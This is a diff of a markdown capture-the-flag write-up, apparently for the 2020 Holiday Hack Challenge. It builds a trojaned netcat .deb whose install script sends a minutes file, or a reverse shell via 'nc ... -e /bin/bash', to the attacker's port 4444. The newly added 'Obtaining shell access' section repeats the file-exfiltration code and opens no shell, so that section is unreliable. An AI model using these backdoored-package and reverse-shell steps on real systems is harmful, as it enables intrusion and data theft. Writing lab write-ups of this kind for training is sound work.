@@ -36,7 +36,9 @@ By opting for
 `/bin/nc 10.6.0.2 4444 -e /bin/bash`
 an interactive reverse shell can be acquired.
 
-The snippet below automatically inserts the correct IP address of the local host and places the package in the right location of the web tree:
+The snippet below automatically inserts the correct IP address of the local host and places the package in the right location of the web tree.
+
+**Obtaining just the file**
 ```
 cd ~/debs
 mkdir tmp
@@ -49,12 +51,28 @@ dpkg-deb -b tmp ../pub/jfrost/backdoor/suriv_amd64.deb
 That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the local host, which has to run the command
 
     nc -lvp 4444 > text
-to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt) (resp. receive the reverse shell connection).
+to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt) 
+
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
+
+**Obtaining shell access**
+```
+cd ~/debs
+mkdir tmp
+dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
+echo /bin/nc `ifconfig eth0 | grep 'inet ' | awk '{print $2}'`' 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt' >> tmp/DEBIAN/postinst
+mkdir -p ../pub/jfrost/backdoor
+dpkg-deb -b tmp ../pub/jfrost/backdoor/suriv_amd64.deb
+
+```
+That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the local host, which has to run the command
+
+    nc -lvp 4444
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTE5NTQ4OTUxMSw3OTczNDE5MjIsMjY4Nj
-UzNDg0LDEyNzI2NTY0MTksODU4MTg4OTI5LDEwOTI3ODUzMjEs
-LTIwNjI2NzUyOTcsLTYxMjg5Nzc5OSwtODUyNzIyNzAzLDE3NT
-gyNDM2NzcsMTYzNDM5NDk0MSwxMjA0NDI2NTM5LC0xNzk4NDE1
-ODk2LC04NzgzOTIyMTYsNTE0MjA5MTU5XX0=
+eyJoaXN0b3J5IjpbLTIwOTcyOTQ2MDgsMTE5NTQ4OTUxMSw3OT
+czNDE5MjIsMjY4NjUzNDg0LDEyNzI2NTY0MTksODU4MTg4OTI5
+LDEwOTI3ODUzMjEsLTIwNjI2NzUyOTcsLTYxMjg5Nzc5OSwtOD
+UyNzIyNzAzLDE3NTgyNDM2NzcsMTYzNDM5NDk0MSwxMjA0NDI2
+NTM5LC0xNzk4NDE1ODk2LC04NzgzOTIyMTYsNTE0MjA5MTU5XX
+0=
 -->
